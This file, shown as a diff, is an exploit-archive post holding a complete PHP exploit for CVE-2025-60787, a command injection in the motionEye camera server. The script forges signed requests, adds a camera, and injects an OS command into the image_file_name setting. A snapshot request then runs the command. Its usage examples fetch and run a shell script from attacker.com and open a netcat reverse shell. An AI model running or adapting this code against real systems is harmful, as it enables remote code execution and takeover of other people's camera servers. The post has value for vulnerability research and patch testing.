@@ -1,0 +1,567 @@
+=============================================================================================================================================
+| # Title     : MotionEye Frontend 0.43.1b4 RCE                                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/motioneye-project/motioneye                                                                              |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/210394/ & 	CVE-2025-60787
+
+[+] Summary    : Command Injection in Configuration Files - Unsanitized user input in the image_file_name parameter 
+                 allows authenticated attackers to inject OS commands via $(command) syntax, leading to remote code execution.
+
+[+] POC :
+
+php motioneye_rce.php check https://target-motioneye.local
+
+php motioneye_rce.php check https://192.168.1.100 admin password123
+
+<?php
+
+
+class MotionEyeRCE {
+    private $target;
+    private $username;
+    private $password;
+    private $uri;
+    private $cookies;
+    private $timeout = 30;
+    private $verify_ssl = false;
+    private $camera_id;
+    
+    public function __construct($target, $username = 'admin', $password = '') {
+        $this->target = rtrim($target, '/');
+        $this->username = $username;
+        $this->password = $password;
+        $this->cookies = [];
+        $this->camera_id = null;
+    }
+    
+    /**
+     * Clean string according to MotionEye's canonicalization rules
+     */
+    private function clean_string($data) {
+        if ($data === null) {
+            return '';
+        }
+        
+        if (!is_string($data)) {
+            $data = (string)$data;
+        }
+        
+        // Regex from MotionEye source code
+        $signature_regex = '/[^A-Za-z0-9\/?_.=&{}\[\]":, -]/';
+        return preg_replace($signature_regex, '-', $data);
+    }
+    
+    /**
+     * Compute SHA1 signature for MotionEye requests
+     */
+    private function compute_signature($method, $path, $body = null, $key = '') {
+        // Parse URL
+        $parsed = parse_url($path);
+        $path_only = $parsed['path'] ?? '';
+        $query_str = $parsed['query'] ?? '';
+        
+        // Parse query parameters
+        $query_params = [];
+        if ($query_str) {
+            parse_str($query_str, $query_params);
+        }
+        
+        // Remove _signature parameter
+        unset($query_params['_signature']);
+        
+        // Sort parameters alphabetically
+        ksort($query_params);
+        
+        // Build canonical query string
+        $canonical_query = '';
+        foreach ($query_params as $k => $v) {
+            if ($canonical_query !== '') {
+                $canonical_query .= '&';
+            }
+            $canonical_query .= $k . '=' . rawurlencode($v);
+        }
+        
+        // Build canonical path
+        $canonical_path = $path_only;
+        if ($canonical_query !== '') {
+            $canonical_path .= '?' . $canonical_query;
+        }
+        
+        // Clean path and body
+        $cleaned_path = $this->clean_string($canonical_path);
+        $cleaned_body = $this->clean_string($body);
+        
+        // Compute key hash
+        $key_hash = strtolower(sha1($key));
+        
+        // Build data to hash
+        $data = $method . ':' . $cleaned_path . ':' . $cleaned_body . ':' . $key_hash;
+        
+        return strtolower(sha1($data));
+    }
+    
+    /**
+     * Generate timestamp in milliseconds
+     */
+    private function generate_timestamp_ms() {
+        return (int)(microtime(true) * 1000);
+    }
+    
+    /**
+     * Send HTTP request with MotionEye signature
+     */
+    private function send_signed_request($method, $path, $data = null, $headers = []) {
+        $url = $this->target . $path;
+        
+        // Add required GET parameters
+        $get_params = [
+            '_username' => $this->username,
+            '_' => $this->generate_timestamp_ms()
+        ];
+        
+        // Parse existing query string if present
+        $parsed = parse_url($url);
+        $base_url = $parsed['scheme'] . '://' . $parsed['host'] . ($parsed['port'] ? ':' . $parsed['port'] : '') . $parsed['path'];
+        $existing_query = [];
+        
+        if (isset($parsed['query'])) {
+            parse_str($parsed['query'], $existing_query);
+            $get_params = array_merge($get_params, $existing_query);
+        }
+        
+        // Build query string
+        $query_str = http_build_query($get_params);
+        $path_with_query = $parsed['path'] . '?' . $query_str;
+        
+        // Compute signature
+        $signature = $this->compute_signature(
+            strtoupper($method),
+            $path_with_query,
+            $data,
+            $this->password
+        );
+        
+        // Add signature to query parameters
+        $get_params['_signature'] = $signature;
+        $query_str = http_build_query($get_params);
+        
+        // Build final URL
+        $final_url = $base_url . '?' . $query_str;
+        
+        // Prepare request
+        $ch = curl_init();
+        
+        $options = [
+            CURLOPT_URL => $final_url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 5,
+            CURLOPT_SSL_VERIFYPEER => $this->verify_ssl,
+            CURLOPT_SSL_VERIFYHOST => $this->verify_ssl ? 2 : 0,
+            CURLOPT_HEADER => true,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            CURLOPT_HTTPHEADER => array_merge([
+                'Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Connection: close'
+            ], $headers)
+        ];
+        
+        if (strtoupper($method) === 'POST') {
+            $options[CURLOPT_POST] = true;
+            if ($data !== null) {
+                $options[CURLOPT_POSTFIELDS] = $data;
+                
+                // Detect content type
+                if (is_array($data)) {
+                    $options[CURLOPT_POSTFIELDS] = http_build_query($data);
+                    $options[CURLOPT_HTTPHEADER][] = 'Content-Type: application/x-www-form-urlencoded';
+                } else {
+                    $options[CURLOPT_POSTFIELDS] = $data;
+                    if (json_decode($data) !== null) {
+                        $options[CURLOPT_HTTPHEADER][] = 'Content-Type: application/json';
+                    }
+                }
+            }
+        }
+        
+        // Add cookies if any
+        if (!empty($this->cookies)) {
+            $cookie_str = '';
+            foreach ($this->cookies as $name => $value) {
+                $cookie_str .= $name . '=' . $value . '; ';
+            }
+            $options[CURLOPT_COOKIE] = rtrim($cookie_str, '; ');
+        }
+        
+        curl_setopt_array($ch, $options);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $error = curl_error($ch);
+        
+        curl_close($ch);
+        
+        if ($response === false) {
+            throw new Exception("cURL error: " . $error);
+        }
+        
+        $headers = substr($response, 0, $header_size);
+        $body = substr($response, $header_size);
+        
+        // Extract and store cookies
+        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headers, $matches);
+        foreach ($matches[1] as $cookie) {
+            $parts = explode('=', $cookie, 2);
+            if (count($parts) == 2) {
+                $this->cookies[$parts[0]] = $parts[1];
+            }
+        }
+        
+        return [
+            'code' => $http_code,
+            'headers' => $headers,
+            'body' => $body
+        ];
+    }
+    
+    /**
+     * Check if target is vulnerable
+     */
+    public function check() {
+        try {
+            $ch = curl_init($this->target);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => $this->timeout,
+                CURLOPT_SSL_VERIFYPEER => $this->verify_ssl,
+                CURLOPT_SSL_VERIFYHOST => $this->verify_ssl ? 2 : 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_USERAGENT => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            ]);
+            
+            $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($http_code !== 200) {
+                return ['vulnerable' => false, 'message' => 'Target not reachable or not MotionEye'];
+            }
+            
+            // Look for motionEye version
+            if (preg_match('/motionEye Version.*?<span[^>]*>([^<]+)</', $response, $matches)) {
+                $version = trim($matches[1]);
+                $clean_version = preg_replace('/[a-zA-Z]/', '', $version);
+                
+                if (version_compare($clean_version, '0.43.15', '<')) {
+                    return [
+                        'vulnerable' => true,
+                        'message' => "Vulnerable version detected: $version",
+                        'version' => $version
+                    ];
+                } else {
+                    return [
+                        'vulnerable' => 'unknown',
+                        'message' => "Newer version detected: $version. Check release notes.",
+                        'version' => $version
+                    ];
+                }
+            }
+            
+            return ['vulnerable' => false, 'message' => 'MotionEye version not found'];
+            
+        } catch (Exception $e) {
+            return ['vulnerable' => false, 'message' => 'Error: ' . $e->getMessage()];
+        }
+    }
+    
+    /**
+     * Add a camera to MotionEye
+     */
+    private function add_camera() {
+        echo "[+] Adding malicious camera...\n";
+        
+        $data = json_encode([
+            'scheme' => 'rstp',
+            'host' => $this->generate_ip(),
+            'port' => '',
+            'path' => '/',
+            'username' => '',
+            'proto' => 'netcam'
+        ]);
+        
+        $response = $this->send_signed_request(
+            'POST',
+            '/config/add/',
+            $data,
+            ['Content-Type: application/json']
+        );
+        
+        if ($response['code'] !== 200) {
+            throw new Exception("Failed to add camera. HTTP {$response['code']}");
+        }
+        
+        $json = json_decode($response['body'], true);
+        if (!$json || !isset($json['id'])) {
+            throw new Exception("Invalid response when adding camera");
+        }
+        
+        $this->camera_id = $json['id'];
+        echo "[+] Camera added successfully (ID: {$this->camera_id})\n";
+        
+        return $this->camera_id;
+    }
+    
+    /**
+     * Configure camera with payload
+     */
+    private function configure_camera($payload) {
+        echo "[+] Configuring camera with payload...\n";
+        
+        $camera_name = 'cam_' . bin2hex(random_bytes(4));
+        $config = [
+            'enabled' => true,
+            'name' => $camera_name,
+            'proto' => 'netcam',
+            'auto_brightness' => false,
+            'rotation' => [0, 90, 180, 270][rand(0, 3)],
+            'framerate' => rand(2, 30),
+            'privacy_mask' => false,
+            'storage_device' => 'custom-path',
+            'root_directory' => "/var/lib/motioneye/{$camera_name}",
+            'upload_enabled' => false,
+            'upload_picture' => false,
+            'upload_movie' => false,
+            'upload_service' => ['ftp', 'sftp', 'webdav'][rand(0, 2)],
+            'upload_method' => ['post', 'put'][rand(0, 1)],
+            'upload_subfolders' => false,
+            'web_hook_storage_enabled' => false,
+            'command_storage_enabled' => false,
+            'text_overlay' => false,
+            'text_scale' => rand(1, 3),
+            'video_streaming' => false,
+            'streaming_framerate' => rand(5, 30),
+            'streaming_quality' => rand(50, 95),
+            'streaming_resolution' => rand(50, 95),
+            'streaming_server_resize' => false,
+            'streaming_port' => '9081',
+            'streaming_auth_mode' => 'disabled',
+            'streaming_motion' => false,
+            'still_images' => true,
+            'image_file_name' => "$({$payload})",  // Payload injection point
+            'image_quality' => rand(50, 95),
+            'capture_mode' => 'manual',
+            'preserve_pictures' => '0',
+            'manual_snapshots' => true,
+            'movies' => false,
+            'movie_file_name' => '%Y-%m-%d/%H-%M-%S',
+            'movie_quality' => rand(50, 95),
+            'movie_format' => 'mp4 => h264_v4l2m2m',
+            'movie_passthrough' => false,
+            'recording_mode' => 'motion-triggered',
+            'max_movie_length' => '0',
+            'preserve_movies' => '0',
+            'motion_detection' => false,
+            'frame_change_threshold' => '0.' . rand(1000000000000000, 9999999999999999),
+            'max_frame_change_threshold' => rand(0, 1),
+            'auto_threshold_tuning' => false,
+            'auto_noise_detect' => false,
+            'noise_level' => rand(10, 32),
+            'light_switch_detect' => '0',
+            'despeckle_filter' => false,
+            'event_gap' => rand(5, 30),
+            'pre_capture' => rand(1, 5),
+            'post_capture' => rand(1, 5),
+            'minimum_motion_frames' => rand(20, 30),
+            'motion_mask' => false,
+            'show_frame_changes' => false,
+            'create_debug_media' => false,
+            'email_notifications_enabled' => false,
+            'telegram_notifications_enabled' => false,
+            'web_hook_notifications_enabled' => false,
+            'web_hook_end_notifications_enabled' => false,
+            'command_notifications_enabled' => false,
+            'command_end_notifications_enabled' => false,
+            'working_schedule' => false,
+            'resolution' => ['320x240', '640x480', '1280x720'][rand(0, 2)]
+        ];
+        
+        $data = json_encode([$this->camera_id => $config]);
+        
+        $response = $this->send_signed_request(
+            'POST',
+            '/config/0/set/',
+            $data,
+            ['Content-Type: application/json']
+        );
+        
+        if ($response['code'] !== 200) {
+            throw new Exception("Failed to configure camera. HTTP {$response['code']}");
+        }
+        
+        echo "[+] Camera configured with payload\n";
+    }
+    
+    /**
+     * Trigger the exploit by taking a snapshot
+     */
+    private function trigger_exploit() {
+        echo "[+] Triggering exploit...\n";
+        
+        $response = $this->send_signed_request(
+            'POST',
+            "/action/{$this->camera_id}/snapshot/",
+            'null',
+            ['Content-Type: application/json']
+        );
+        
+        if ($response['code'] !== 200) {
+            throw new Exception("Failed to trigger exploit. HTTP {$response['code']}");
+        }
+        
+        echo "[+] Exploit triggered\n";
+    }
+    
+    /**
+     * Remove the camera
+     */
+    private function remove_camera() {
+        if (!$this->camera_id) {
+            return;
+        }
+        
+        echo "[+] Removing camera...\n";
+        
+        try {
+            $response = $this->send_signed_request(
+                'POST',
+                "/config/{$this->camera_id}/rem/",
+                'null',
+                ['Content-Type: application/json']
+            );
+            
+            if ($response['code'] === 200) {
+                echo "[+] Camera removed successfully\n";
+            }
+        } catch (Exception $e) {
+            echo "[-] Error removing camera: " . $e->getMessage() . "\n";
+        }
+        
+        $this->camera_id = null;
+    }
+    
+    /**
+     * Generate random IP address
+     */
+    private function generate_ip() {
+        return rand(1, 254) . '.' . rand(0, 254) . '.' . rand(0, 254) . '.' . rand(1, 254);
+    }
+    
+    /**
+     * Execute exploit
+     */
+    public function exploit($payload) {
+        try {
+            // Check target first
+            $check = $this->check();
+            if (!$check['vulnerable']) {
+                echo "[-] Target appears not to be vulnerable: " . $check['message'] . "\n";
+                return false;
+            }
+            
+            echo "[+] Target appears to be vulnerable\n";
+            
+            // Add camera
+            $this->add_camera();
+            
+            // Configure with payload
+            $this->configure_camera($payload);
+            
+            // Trigger exploit
+            $this->trigger_exploit();
+            
+            echo "[+] Exploit completed. Check for callback.\n";
+            
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Exploit failed: " . $e->getMessage() . "\n";
+            
+            // Clean up
+            $this->remove_camera();
+            
+            return false;
+        }
+    }
+    
+    /**
+     * Clean up resources
+     */
+    public function cleanup() {
+        $this->remove_camera();
+    }
+    
+    public function __destruct() {
+        $this->cleanup();
+    }
+}
+
+/**
+ * Command-line interface
+ */
+if (php_sapi_name() === 'cli') {
+    if ($argc < 2) {
+        echo "MotionEye RCE Exploit (CVE-2025-60787)\n";
+        echo "Usage:\n";
+        echo "  php {$argv[0]} check <url> [username] [password]\n";
+        echo "  php {$argv[0]} exploit <url> <payload> [username] [password]\n";
+        echo "\nExamples:\n";
+        echo "  php {$argv[0]} check https://192.168.1.100\n";
+        echo "  php {$argv[0]} exploit https://192.168.1.100 'curl http://attacker.com/shell.sh|sh'\n";
+        echo "  php {$argv[0]} exploit https://192.168.1.100 'nc -e /bin/bash 192.168.1.50 4444' admin password123\n";
+        exit(1);
+    }
+    
+    $command = $argv[1];
+    $url = $argv[2] ?? '';
+    
+    if ($command === 'check') {
+        $username = $argv[3] ?? 'admin';
+        $password = $argv[4] ?? '';
+        
+        $exploit = new MotionEyeRCE($url, $username, $password);
+        $result = $exploit->check();
+        
+        echo "Target: $url\n";
+        echo "Status: " . $result['message'] . "\n";
+        if (isset($result['version'])) {
+            echo "Version: " . $result['version'] . "\n";
+        }
+        
+    } elseif ($command === 'exploit') {
+        $payload = $argv[3] ?? '';
+        $username = $argv[4] ?? 'admin';
+        $password = $argv[5] ?? '';
+        
+        if (!$payload) {
+            echo "[-] Payload required for exploit command\n";
+            exit(1);
+        }
+        
+        $exploit = new MotionEyeRCE($url, $username, $password);
+        $exploit->exploit($payload);
+        
+    } else {
+        echo "[-] Unknown command: $command\n";
+        exit(1);
+    }
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
